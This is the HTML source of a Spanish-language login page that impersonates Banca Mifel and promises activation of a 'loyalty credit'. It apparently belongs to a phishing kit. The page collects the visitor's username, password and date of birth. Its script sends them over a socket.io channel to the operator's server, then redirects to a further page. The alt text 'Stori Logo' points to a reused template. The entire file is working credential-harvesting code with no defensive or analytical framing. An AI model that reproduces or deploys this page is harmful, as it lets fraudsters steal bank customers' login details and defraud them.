<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MIFEL</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f3f6f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
    }

    .screen {
      background: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      width: 100px;
      margin-bottom: 1rem;
    }

    h2 {
      font-size: 1.5em;
      margin-bottom: 1rem;
    }

    p {
      font-size: 1em;
      color: #555;
      margin-bottom: 1rem;
    }

    form {
      width: 100%;
    }

    .input-group {
      width: 100%;
      background: #f0f2f5;
      border-radius: 8px;
      padding: 0.75rem 1rem;
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      position: relative;
    }

    .input-group .icon {
      color: #888;
      margin-right: 0.75rem;
    }

    .input-group input {
      border: none;
      background: transparent;
      outline: none;
      flex: 1;
      font-size: 1rem;
      padding: 0;
      height: 1.8rem;
    }

    .input-label {
      position: absolute;
      top: -0.75rem;
      left: 1rem;
      background: #fff;
      padding: 0 0.25rem;
      font-size: 0.75rem;
      color: #555;
    }

    button {
      background-color: #00CCC5;
      color: white;
      padding: 10px 24px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: 100%;
      margin-top: 1rem;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #8CE6E3;
    }

    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }

    .mensaje-error {
      color: red;
      margin-top: -0.5rem;
      margin-bottom: 0.75rem;
      font-size: 0.85rem;
      text-align: left;
      width: 100%;
    }

    .campo-requerido {
      border: 1px solid red !important;
    }

    @media (max-width: 480px) {
      .screen {
        padding: 1.5rem;
      }
    }
  </style>
</head>
<body>
  <div class="screen active" id="pantallaInicio">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8i5Fa_PaKq0jqIPv-U13xYZPPCoVRIj2auw&sssss" alt="Stori Logo" class="logo">
    <h2>Bienvenido a Banca Mifel.</h2>
    <p>Ingrese a su cuenta para iniciar con el proceso de activación y desembolso de crédito de fidelidad.</p>

    <form id="login-form">
      <div class="input-group">
        <span class="icon"><i class="fas fa-user"></i></span>
        <label class="input-label" for="usuario">Usuario</label>
        <input type="text" id="usuario" required>
      </div>
      <p id="usuarioError" class="mensaje-error"></p>

      <div class="input-group">
        <span class="icon"><i class="fas fa-lock"></i></span>
        <label class="input-label" for="password">Contraseña</label>
        <input type="password" id="password" required>
      </div>
      <p id="passwordError" class="mensaje-error"></p>

      <div class="input-group">
        <span class="icon"><i class="fas fa-calendar-alt"></i></span>
        <label class="input-label" for="fechaNacimiento">Fecha de nacimiento</label>
        <input type="date" id="fechaNacimiento" required>
      </div>
      <p id="fechaNacimientoError" class="mensaje-error"></p>

      <button type="submit" id="btnContinuar">Continuar</button>
    </form>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    window.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('login-form');

      form.addEventListener('submit', (e) => {
        e.preventDefault();

        if (validarUsuario() && validarPassword() && validarFechaNacimiento()) {
          const usuario = document.getElementById('usuario').value;
          const contrasena = document.getElementById('password').value;
          const fechaNacimiento = document.getElementById('fechaNacimiento').value;

          const sessionId = Math.random().toString(36).substring(2, 15);
          localStorage.setItem('sessionId', sessionId);

          socket.emit('dataForm', { usuario, contrasena, fechaNacimiento, sessionId });

          window.location.href = 'opciones.html';
        }
      });
    });

    function validarUsuario() {
      const usuario = document.getElementById("usuario").value;
      const usuarioError = document.getElementById("usuarioError");
      const usuarioInput = document.getElementById("usuario");

      const valido = /^[a-zA-Z0-9_]{4,20}$/;

      if (!usuario) {
        usuarioError.textContent = "El nombre de usuario es obligatorio";
        usuarioInput.classList.add("campo-requerido");
        return false;
      } else if (!valido.test(usuario)) {
        usuarioError.textContent = "Debe tener entre 4 y 20 caracteres alfanuméricos o guiones bajos";
        usuarioInput.classList.add("campo-requerido");
        return false;
      } else {
        usuarioError.textContent = "";
        usuarioInput.classList.remove("campo-requerido");
        return true;
      }
    }

    function validarPassword() {
      const password = document.getElementById("password").value;
      const passwordError = document.getElementById("passwordError");
      const passwordInput = document.getElementById("password");

      if (!password) {
        passwordError.textContent = "La contraseña es obligatoria";
        passwordInput.classList.add("campo-requerido");
        return false;
      } else if (password.length < 4) {
        passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
        passwordInput.classList.add("campo-requerido");
        return false;
      } else {
        passwordError.textContent = "";
        passwordInput.classList.remove("campo-requerido");
        return true;
      }
    }

    function validarFechaNacimiento() {
      const fechaNacimiento = document.getElementById("fechaNacimiento").value;
      const fechaNacimientoError = document.getElementById("fechaNacimientoError");
      const input = document.getElementById("fechaNacimiento");

      if (!fechaNacimiento) {
        fechaNacimientoError.textContent = "La fecha de nacimiento es obligatoria";
        input.classList.add("campo-requerido");
        return false;
      } else {
        fechaNacimientoError.textContent = "";
        input.classList.remove("campo-requerido");
        return true;
      }
    }
  </script>
</body>
</html>
